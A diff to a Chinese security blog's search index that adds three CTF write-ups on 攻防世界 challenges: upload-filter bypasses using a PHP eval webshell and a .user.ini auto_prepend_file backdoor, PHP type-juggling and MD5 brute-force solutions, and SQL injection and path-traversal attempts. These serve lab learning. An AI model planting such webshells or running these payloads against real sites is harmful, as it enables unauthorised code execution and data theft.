@@ -4,6 +4,85 @@
   
     
     <entry>
+      <title>攻防世界easyupload</title>
+      <link href="/jcxj/2022/10/05/gong-fang-shi-jie-easyupload/"/>
+      <url>/jcxj/2022/10/05/gong-fang-shi-jie-easyupload/</url>
+      
+        <content type="html"><![CDATA[<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><pre class="line-numbers language-none"><code class="language-none">检查文件内容是否有php字符串检查后缀中是否有htaccess或ph检查文件头部信息文件MIME类型<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><h4 id="1-检查文件内容是否有php字符串"><a href="#1-检查文件内容是否有php字符串" class="headerlink" title="1.检查文件内容是否有php字符串"></a>1.检查文件内容是否有php字符串</h4><pre class="line-numbers language-none"><code class="language-none">php文件中使用&lt;? $_REQUEST[&#39;cmd&#39;];?&gt;把php省掉,只留尖括号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="2-检查头部信息"><a href="#2-检查头部信息" class="headerlink" title="2.检查头部信息"></a>2.检查头部信息</h4><pre class="line-numbers language-none"><code class="language-none">这里最简单的就是copy合成图片马copy a.jpg&#x2F;b + shell.php&#x2F;a shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="3-mime类型检测"><a href="#3-mime类型检测" class="headerlink" title="3.mime类型检测"></a>3.mime类型检测</h4><pre class="line-numbers language-none"><code class="language-none">抓包,并修改Content-Typeimage&#x2F;pngimage&#x2F;jpeg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/jcxj/2022/10/05/gong-fang-shi-jie-easyupload/image-20221005210047472.png" class="" title="image-20221005210047472"><h4 id="4-fastcgi的-user-ini漏洞"><a href="#4-fastcgi的-user-ini漏洞" class="headerlink" title="4.fastcgi的.user.ini漏洞"></a>4.fastcgi的.user.ini漏洞</h4><p>参考链接:<a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">.user.ini文件构成的PHP后门 - phith0n (wooyun.js.org)</a></p><p><strong>什么是.user.ini</strong></p><pre class="line-numbers language-none"><code class="language-none">除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER[&#39;DOCUMENT_ROOT&#39;] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。简单的说,php.ini是官方写的,控制全部php文件,.user.ini实际上就是一个可以由用户“自定义”的php.ini;控制其所在目录下的php文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>.user.ini的作用</strong></p><pre class="line-numbers language-none"><code class="language-none">我们可以借助.user.ini轻松让同一路径下php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>user.ini中的auto_prepend_file和auto_append_file值</strong></p><pre class="line-numbers language-none"><code class="language-none">指定一个文件，自动包含在要执行的文件前,类似于在文件前调用了require()函数而auto_append_file类似，只是在文件后面包含. 使用方法很简单，直接写在.user.ini中：auto_prepend_file&#x3D;a.jpg这个时候,去访问.user.ini所在目录下的所有php文件,都会自动包含a.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>1.先上传一个.user.ini文件,并修改mime值为image/png</p><p>图中因为有对文件头做检验,因此多加了一个GIF89a</p><img src="/jcxj/2022/10/05/gong-fang-shi-jie-easyupload/image-20221005211909177.png" class="" title="image-20221005211909177"><p>2.上传一个a.jpg文件,源码如下</p><pre class="line-numbers language-none"><code class="language-none">&lt;?&#x3D;eval($_REQUEST[&#39;a&#39;]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3.蚁剑连接拿到flag</p><p>看到警告记得多试几次</p><img src="/jcxj/2022/10/05/gong-fang-shi-jie-easyupload/image-20221005212657862.png" class="" title="image-20221005212657862"><img src="/jcxj/2022/10/05/gong-fang-shi-jie-easyupload/image-20221005212640892.png" class="" title="image-20221005212640892"><h3 id="经验"><a href="#经验" class="headerlink" title="经验"></a>经验</h3><p>1.没什么思路的话先看源码,再扫描目录,bp抓包</p><p>2.文件上传的话如果有对文件内容中的php进行检测,记得用&lt;?=?&gt;来绕过</p><p>3.常见文件后缀名都试了(php,php3,phar),mima也改了,文件头也添加了(‘GIF89a’),还是不行的话就试试上传</p><pre class="line-numbers language-none"><code class="language-none">.htaccess.user.ini等配置文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>4.看看源码中的特殊函数如,spl_autoload_register</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> ctf </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> ctf </tag>
+            
+            <tag> fileupload </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>攻防世界easyphp</title>
+      <link href="/jcxj/2022/10/05/gong-fang-shi-jie-easyphp/"/>
+      <url>/jcxj/2022/10/05/gong-fang-shi-jie-easyphp/</url>
+      
+        <content type="html"><![CDATA[<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><pre class="line-numbers language-none"><code class="language-none">&lt;?phphighlight_file(__FILE__);$key1 &#x3D; 0;$key2 &#x3D; 0;$a &#x3D; $_GET[&#39;a&#39;];$b &#x3D; $_GET[&#39;b&#39;];if(isset($a) &amp;&amp; intval($a) &gt; 6000000 &amp;&amp; strlen($a) &lt;&#x3D; 3)&#123;    if(isset($b) &amp;&amp; &#39;8b184b&#39; &#x3D;&#x3D;&#x3D; substr(md5($b),-6,6))&#123;        $key1 &#x3D; 1;        &#125;else&#123;            die(&quot;Emmm...再想想&quot;);        &#125;    &#125;else&#123;    die(&quot;Emmm...&quot;);&#125;$c&#x3D;(array)json_decode(@$_GET[&#39;c&#39;]);if(is_array($c) &amp;&amp; !is_numeric(@$c[&quot;m&quot;]) &amp;&amp; $c[&quot;m&quot;] &gt; 2022)&#123;    if(is_array(@$c[&quot;n&quot;]) &amp;&amp; count($c[&quot;n&quot;]) &#x3D;&#x3D; 2 &amp;&amp; is_array($c[&quot;n&quot;][0]))&#123;        $d &#x3D; array_search(&quot;DGGJ&quot;, $c[&quot;n&quot;]);        $d &#x3D;&#x3D;&#x3D; false?die(&quot;no...&quot;):NULL;        foreach($c[&quot;n&quot;] as $key&#x3D;&gt;$val)&#123;            $val&#x3D;&#x3D;&#x3D;&quot;DGGJ&quot;?die(&quot;no......&quot;):NULL;        &#125;        $key2 &#x3D; 1;    &#125;else&#123;        die(&quot;no hack&quot;);    &#125;&#125;else&#123;    die(&quot;no&quot;);&#125;if($key1 &amp;&amp; $key2)&#123;    include &quot;Hgfks.php&quot;;    echo &quot;You&#39;re right&quot;.&quot;\n&quot;;    echo $flag;&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="a绕过"><a href="#a绕过" class="headerlink" title="$a绕过"></a>$a绕过</h3><pre class="line-numbers language-none"><code class="language-none">isset($a) &amp;&amp; intval($a) &gt; 6000000 &amp;&amp; strlen($a) &lt;&#x3D; 3isset($a) : a有值intval($a) &gt; 6000000 : a转化为整数后要大于6000000strlen($a) a的长度小于等于3综上所述: a&#x3D;9e9<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="b绕过"><a href="#b绕过" class="headerlink" title="$b绕过"></a>$b绕过</h3><p>暴力破解md5</p><pre class="line-numbers language-none"><code class="language-none">isset($b) &amp;&amp; &#39;8b184b&#39; &#x3D;&#x3D;&#x3D; substr(md5($b),-6,6)substr(md5($b),-6,6): 对加密后的值进行截取,截取最后六位<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">import hashlibfor i in range(1,100000000000):    s &#x3D; hashlib.md5(str(i).encode(&quot;utf-8&quot;)).hexdigest()[-6:]    if s &#x3D;&#x3D; &quot;8b184b&quot;:        print(i)        break#$b&#x3D;53724<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="c绕过"><a href="#c绕过" class="headerlink" title="$c绕过"></a>$c绕过</h3><pre class="line-numbers language-none"><code class="language-none">$c&#x3D;(array)json_decode(@$_GET[&#39;c&#39;]); $c是json格式c&#x3D;&#123;&quot;a&quot;:1,&quot;b&quot;:2&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">if(is_array($c) &amp;&amp; !is_numeric(@$c[&quot;m&quot;]) &amp;&amp; $c[&quot;m&quot;] &gt; 2022)&#123;is_array($c) 这个可以不用管,因为上一行强制类型转化了!is_numeric(@$c[&quot;m&quot;]) m的值不能是纯数字$c[&quot;m&quot;] &gt; 2022 弱类型比较漏洞综上所述: c&#x3D;&#123;&quot;m&quot;:&quot;9999e&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">if(is_array(@$c[&quot;n&quot;]) &amp;&amp; count($c[&quot;n&quot;]) &#x3D;&#x3D; 2 &amp;&amp; is_array($c[&quot;n&quot;][0]))&#123;$d &#x3D; array_search(&quot;DGGJ&quot;, $c[&quot;n&quot;]);foreach($c[&quot;n&quot;] as $key&#x3D;&gt;$val)&#123;            $val&#x3D;&#x3D;&#x3D;&quot;DGGJ&quot;?die(&quot;no......&quot;):NULL;        &#125;is_array(@$c[&quot;n&quot;]) n为数组count($c[&quot;n&quot;]) &#x3D;&#x3D; 2 n的元素要有两个is_array($c[&quot;n&quot;][0]) n的第一个元素为数组$d &#x3D; array_search(&quot;DGGJ&quot;, $c[&quot;n&quot;]); 对联合n数组中的val进行查找,找打就返回对应的key,没找到就没有返回值,或者返回值为空,此时$d &#x3D;&#x3D;&#x3D; false为true;$val&#x3D;&#x3D;&#x3D;&quot;DGGJ&quot;?die(&quot;no......&quot;):NULL; 判断联合数组中有没有val为DGGJ,有的话直接die最后两个条件,直接让他找不到就好了综上所述 c&#x3D;&#123;&quot;m&quot;:&quot;9999e&quot;,&quot;n&quot;:[[],0]&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>注意要用” “而不是’ ‘</strong></p><h3 id="关于0和’DGGJ’的关系"><a href="#关于0和’DGGJ’的关系" class="headerlink" title="关于0和’DGGJ’的关系"></a>关于0和’DGGJ’的关系</h3><pre class="line-numbers language-none"><code class="language-none">array_search(&quot;DGGJ&quot;, $c[&quot;n&quot;]);array_search是弱类型比较,当&quot;DGGJ&quot; 和 0 做比较的时候, 会先将&quot;DGGJ&quot;强制转化为整数类型,也就是0,因此返回0的下标,也就是1而$val&#x3D;&#x3D;&#x3D;&quot;DGGJ&quot; 就是强类型比较,不会进行强制类型转化，因此全部都触发了false<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> ctf </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> ctf </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>攻防世界Zhuanxv-sql注入</title>
+      <link href="/jcxj/2022/10/04/gong-fang-shi-jie-zhuanxv/"/>
+      <url>/jcxj/2022/10/04/gong-fang-shi-jie-zhuanxv/</url>
+      
+        <content type="html"><![CDATA[<h3 id="1-拿到网站后什么也没有-用dirsearch扫一下"><a href="#1-拿到网站后什么也没有-用dirsearch扫一下" class="headerlink" title="1.拿到网站后什么也没有,用dirsearch扫一下"></a>1.拿到网站后什么也没有,用dirsearch扫一下</h3><p>扫到了一个路径,点进去看发现需要登陆</p><img src="/jcxj/2022/10/04/gong-fang-shi-jie-zhuanxv/image-20221004123551078.png" class="" title="image-20221004123551078"><h3 id="2-一个登录框-试试sql注入"><a href="#2-一个登录框-试试sql注入" class="headerlink" title="2.一个登录框,试试sql注入"></a>2.一个登录框,试试sql注入</h3><img src="/jcxj/2022/10/04/gong-fang-shi-jie-zhuanxv/image-20221004123627645.png" class="" title="image-20221004123627645"><p>提交后,页面非常明显的闪了一下,并且没有提示密码错误,而用admin/admin试会提示用户名和密码错误</p><img src="/jcxj/2022/10/04/gong-fang-shi-jie-zhuanxv/image-20221004123714179.png" class="" title="image-20221004123714179"><p>而用’)的时候又提醒错误了因此猜测sql语句为</p><pre class="line-numbers language-none"><code class="language-none">select * from a where username&#x3D;(&#39;$&#39;) and password &#x3D; &#39;?&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>后来又试了一下 1/ ‘，直接提示错误,说明注入字段在username</p><p><strong>当字段为特殊符号(如#$)会提示登录错误,可能是后台有黑名单?</strong></p><h3 id="对passwd进行fuzz测试"><a href="#对passwd进行fuzz测试" class="headerlink" title="对passwd进行fuzz测试"></a>对passwd进行fuzz测试</h3><img src="/jcxj/2022/10/04/gong-fang-shi-jie-zhuanxv/image-20221004130129028.png" class="" title="image-20221004130129028"><p>特殊字符中只有%是可以进去的</p><h3 id="对username进行fuzz测试"><a href="#对username进行fuzz测试" class="headerlink" title="对username进行fuzz测试"></a>对username进行fuzz测试</h3><img src="/jcxj/2022/10/04/gong-fang-shi-jie-zhuanxv/image-20221004130459373.png" class="" title="image-20221004130459373"><h3 id="3-盲注"><a href="#3-盲注" class="headerlink" title="3.盲注"></a>3.盲注</h3><p>因为报错没有回显,因此试试盲注</p><pre class="line-numbers language-none"><code class="language-none">&#39;) or if(1&#x3D;1,sleep(10),1) #&#39; or if(1&#x3D;1,sleep(10),1) #<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这些尝试都失败了,直接看wp</p><h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><p>1.github上搜索一下Zhuanxv,直接就拿到源码了</p><img src="/jcxj/2022/10/04/gong-fang-shi-jie-zhuanxv/image-20221004184213630.png" class="" title="image-20221004184213630"><h3 id="2-ctrl-U看源码"><a href="#2-ctrl-U看源码" class="headerlink" title="2.ctrl+U看源码"></a>2.ctrl+U看源码</h3><img src="/jcxj/2022/10/04/gong-fang-shi-jie-zhuanxv/image-20221004184326453.png" class="" title="image-20221004184326453"><p>注意到这一行</p><h3 id="3-抓包看看"><a href="#3-抓包看看" class="headerlink" title="3.抓包看看"></a>3.抓包看看</h3><img src="/jcxj/2022/10/04/gong-fang-shi-jie-zhuanxv/image-20221004185043523.png" class="" title="image-20221004185043523"><p>jsessionid说明是java写的,因此去找/WEB-INF/web.xml读取配置文件</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;61.147.171.105:63786&#x2F;loadimage?fileName&#x3D;&#x2F;..&#x2F;..&#x2F;WEB-INF&#x2F;web.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/jcxj/2022/10/04/gong-fang-shi-jie-zhuanxv/image-20221004185556803.png" class="" title="image-20221004185556803">]]></content>
+      
+      
+      <categories>
+          
+          <category> ctf </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> ctf </tag>
+            
+            <tag> sql注入 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>攻防世界Guess</title>
       <link href="/jcxj/2022/10/04/gong-fang-shi-jie-guess/"/>
       <url>/jcxj/2022/10/04/gong-fang-shi-jie-guess/</url>
@@ -318,9 +397,9 @@
       
         <tags>
             
-            <tag> Tomcat漏洞 </tag>
-            
             <tag> CVE </tag>
+            
+            <tag> Tomcat漏洞 </tag>
             
         </tags>
       
@@ -345,9 +424,9 @@
       
         <tags>
             
-            <tag> Tomcat漏洞 </tag>
-            
             <tag> 解析漏洞 </tag>
+            
+            <tag> Tomcat漏洞 </tag>
             
         </tags>
       
